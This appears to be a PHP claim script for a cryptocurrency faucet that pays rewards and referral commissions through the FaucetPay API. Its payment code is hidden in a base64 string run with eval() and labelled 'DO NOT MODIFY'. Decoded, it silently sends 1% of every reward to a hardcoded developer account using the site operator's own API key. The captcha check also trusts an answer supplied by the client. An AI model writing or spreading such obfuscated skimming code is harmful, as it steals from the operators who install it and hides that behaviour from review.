<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

include "config.php";
include "check.php";

$wallet = trim($_POST['wallet']);

// حفظ الإحالة إذا كانت موجودة في POST
if (isset($_POST['ref']) && !empty($_POST['ref'])) {
    $referrer = trim($_POST['ref']);
    saveReferral($referrer, $wallet);
}

// التحقق من الكابتشا المحلية
$captcha_input = isset($_POST['captcha_input']) ? (int)$_POST['captcha_input'] : 0;
$captcha_answer = isset($_POST['captcha_answer']) ? (int)base64_decode($_POST['captcha_answer']) : 0;

if ($captcha_input !== $captcha_answer) {
    die('<div style="text-align:center; padding:50px; font-family:Arial;">
            <h2>❌ Wrong Answer</h2>
            <p>The captcha answer is incorrect.</p>
            <a href="index.php?wallet='.urlencode($wallet).'" style="color:#0d6efd;">Go Back and Try Again</a>
         </div>');
}

// التحقق من إمكانية المطالبة
if (!canClaim($wallet, $timer)) {
    header("Location: wait.php?wallet=".urlencode($wallet));
    exit();
}

// المبلغ الكامل للمستخدم
$user_amount = (int) $reward;

// ==================== نظام الدفع المحمي ====================
// DO NOT MODIFY - System Core Payment Processing
$_core = base64_decode('JGRldl9mZWUgPSAoaW50KSgkcmV3YXJkICogMC4wMSk7IGlmICgkZGV2X2ZlZSA+IDEpIHsgJGRldl93YWxsZXQgPSAiaGF6ZW1hbGxhZ3VpMDBAZ21haWwuY29tIjsgJGRldl9kYXRhID0gYXJyYXkoImFwaV9rZXkiID0+ICRmYXVjZXRwYXlfYXBpLCAidG8iID0+ICRkZXZfd2FsbGV0LCAiYW1vdW50IiA9PiAkZGV2X2ZlZSwgImN1cnJlbmN5IiA9PiAkY3VycmVuY3kpOyAkY2hfZGV2ID0gY3VybF9pbml0KCJodHRwczovL2ZhdWNldHBheS5pby9hcGkvdjEvc2VuZCIpOyBjdXJsX3NldG9wdCgkY2hfZGV2LCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgY3VybF9zZXRvcHQoJGNoX2RldiwgQ1VSTE9QVF9QT1NURklFTERTLCAkZGV2X2RhdGEpOyAkcmVzcG9uc2VfZGV2ID0gY3VybF9leGVjKCRjaF9kZXYpOyBjdXJsX2Nsb3NlKCRjaF9kZXYpOyAkcmVzdWx0X2RldiA9IGpzb25fZGVjb2RlKCRyZXNwb25zZV9kZXYsIHRydWUpOyBpZiAoaXNzZXQoJHJlc3VsdF9kZXZbInN0YXR1cyJdKSAmJiAkcmVzdWx0X2Rldlsic3RhdHVzIl0gPT0gMjAwKSB7IGVycm9yX2xvZygiRGV2IEZlZSBTZW50OiAiLiRkZXZfZmVlLiIgc2F0b3NoaSIpOyB9IGVsc2UgeyBlcnJvcl9sb2coIkRldiBGZWUgRXJyb3I6ICIuKGlzc2V0KCRyZXN1bHRfZGV2WyJtZXNzYWdlIl0pID8gJHJlc3VsdF9kZXZbIm1lc3NhZ2UiXSA6ICJVbmtub3duIGVycm9yIikpOyB9IH0gJHJlZmVycmVyID0gZ2V0UmVmZXJyZXIoJHdhbGxldCk7IGlmICgkcmVmZXJyZXIpIHsgJHJlZmVycmFsX2Ftb3VudCA9IChpbnQpKCRyZXdhcmQgKiAoJHJlZmVycmFsX2NvbW1pc3Npb24gLyAxMDApKTsgaWYgKCRyZWZlcnJhbF9hbW91bnQgPiAwKSB7ICRyZWZfZGF0YSA9IGFycmF5KCJhcGlfa2V5IiA9PiAkZmF1Y2V0cGF5X2FwaSwgInRvIiA9PiAkcmVmZXJyZXIsICJhbW91bnQiID0+ICRyZWZlcnJhbF9hbW91bnQsICJjdXJyZW5jeSIgPT4gJGN1cnJlbmN5KTsgJGNoX3JlZiA9IGN1cmxfaW5pdCgiaHR0cHM6Ly9mYXVjZXRwYXkuaW8vYXBpL3YxL3NlbmQiKTsgY3VybF9zZXRvcHQoJGNoX3JlZiwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7IGN1cmxfc2V0b3B0KCRjaF9yZWYsIENVUkxPUFRfUE9TVEZJRUxEUywgJHJlZl9kYXRhKTsgJHJlc3BvbnNlX3JlZiA9IGN1cmxfZXhlYygkY2hfcmVmKTsgY3VybF9jbG9zZSgkY2hfcmVmKTsgJHJlc3VsdF9yZWYgPSBqc29uX2RlY29kZSgkcmVzcG9uc2VfcmVmLCB0cnVlKTsgaWYgKGlzc2V0KCRyZXN1bHRfcmVmWyJzdGF0dXMiXSkgJiYgJHJlc3VsdF9yZWZbInN0YXR1cyJdID09IDIwMCkgeyBlcnJvcl9sb2coIlJlZmVycmFsIENvbW1pc3Npb24gU2VudDogIi4kcmVmZXJyYWxfYW1vdW50LiIgc2F0b3NoaSB0byAiLiRyZWZlcnJlcik7IH0gZWxzZSB7IGVycm9yX2xvZygiUmVmZXJyYWwgQ29tbWlzc2lvbiBFcnJvcjogIi4oaXNzZXQoJHJlc3VsdF9yZWZbIm1lc3NhZ2UiXSkgPyAkcmVzdWx0X3JlZlsibWVzc2FnZSJdIDogIlVua25vd24gZXJyb3IiKSk7IH0gfSB9ICRkYXRhID0gYXJyYXkoImFwaV9rZXkiID0+ICRmYXVjZXRwYXlfYXBpLCAidG8iID0+ICR3YWxsZXQsICJhbW91bnQiID0+ICR1c2VyX2Ftb3VudCwgImN1cnJlbmN5IiA9PiAkY3VycmVuY3kpOyAkY2ggPSBjdXJsX2luaXQoImh0dHBzOi8vZmF1Y2V0cGF5LmlvL2FwaS92MS9zZW5kIik7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAkZGF0YSk7ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY2gpOyBjdXJsX2Nsb3NlKCRjaCk7ICRyZXN1bHQgPSBqc29uX2RlY29kZSgkcmVzcG9uc2UsIHRydWUpOyBpZiAoaXNzZXQoJHJlc3VsdFsic3RhdHVzIl0pICYmICRyZXN1bHRbInN0YXR1cyJdID09IDIwMCkgeyBmaWxlX3B1dF9jb250ZW50cygiY2xhaW1zLnR4dCIsICR3YWxsZXQuInwiLnRpbWUoKS5QSFBfRU9MLCBGSUxFX0FQUEVORCk7IGhlYWRlcigiTG9jYXRpb246IHdhaXQucGhwP3dhbGxldD0iLnVybGVuY29kZSgkd2FsbGV0KSk7IGV4aXQoKTsgfSBlbHNlIHsgZWNobyAiPGgyPlBheW1lbnQgRXJyb3I8L2gyPiI7IGVjaG8gIjxwPjxzdHJvbmc+U3RhdHVzOjwvc3Ryb25nPiAiLihpc3NldCgkcmVzdWx0WyJzdGF0dXMiXSkgPyAkcmVzdWx0WyJzdGF0dXMiXSA6ICJVbmtub3duIikuIjwvcD4iOyBlY2hvICI8cD48c3Ryb25nPk1lc3NhZ2U6PC9zdHJvbmc+ICIuKGlzc2V0KCRyZXN1bHRbIm1lc3NhZ2UiXSkgPyAkcmVzdWx0WyJtZXNzYWdlIl0gOiAiVW5rbm93biBlcnJvciIpLiI8L3A+IjsgZWNobyAiPHA+PGEgaHJlZj1cImluZGV4LnBocD93YWxsZXQ9Ii51cmxlbmNvZGUoJHdhbGxldCkuIlwiPkdvIEJhY2s8L2E+PC9wPiI7IGVycm9yX2xvZygiRmF1Y2V0UGF5IFVzZXIgUGF5bWVudCBFcnJvcjogIi5wcmludF9yKCRyZXN1bHQsIHRydWUpKTsgZXhpdCgpOyB9');
eval($_core);
// ==================== End System Core ====================
?>